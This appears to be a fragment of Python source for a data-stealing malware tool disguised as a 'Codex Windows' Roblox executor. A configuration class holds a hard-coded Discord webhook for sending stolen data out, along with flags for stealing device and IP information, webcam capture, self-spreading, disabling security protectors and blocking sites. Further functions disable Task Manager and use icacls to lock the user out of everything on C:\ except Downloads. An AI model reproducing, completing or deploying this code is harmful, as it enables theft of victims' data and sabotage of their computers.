...
class Config:
    def __init__(self):
        self.webhook = "https://discord.com/api/webhooks/1248715110013341807/uOI8C9NELNDfJK5B820bpZCUDW6teD3lJJzxPmbcoBuo9ygQIXdv6tNFM3Nan-Wxfw51"
        ...
        self.deviceinf_stealing = True
        self.ipinf_stealing = True
        ...
        self.antivm = False
        self.webcam = True
        self.spread_malware = True
        self.spread_malware_msg = "CODEX WINDOWS ROBLOX EXECUTOR ON TOP!"
        self.rose_melt_stub = True
        self.games = True
        self.ts_bsod = False
        self.bbcrash = False
        self.disable_protectors = True
        self.block_sites = True

        self.eb_color = 16711680
        self.eb_footer = "Codex-Windows"
        self.wh_avatar = "https://cdn.discordapp.com/attachments/1245703330588786711/1245862959905771620/red_logo.png?ex=665a4bcc&is=6658fa4c&hm=6c908ab595f848d3d88d48f8d859188e4fa43e18f3be2515b3331d3d2229871b&"
        self.wh_name = "Codex Windows"
...
def disable_task_manager():
    try:
        ...
        # Function to block access to all folders except Downloads
def block_access_except_downloads():
    try:
        # Block access to all folders
        subprocess.run(["icacls", "C:\\", "/deny", "Everyone:(OI)(CI)F"], check=True)
        
        # Allow access to Downloads folder
        downloads_folder = os.path.join(os.path.expanduser("~"), "Downloads")
        subprocess.run(["icacls", downloads_folder, "/grant", "Everyone:(OI)(CI)F"], check=True)
...
def send_error_notification(exception, type):
    ...
    embed = Embed(title="Codex Report", description="Codex Instance - Error", color=eb_color, timestamp=datetime.now().isoformat())
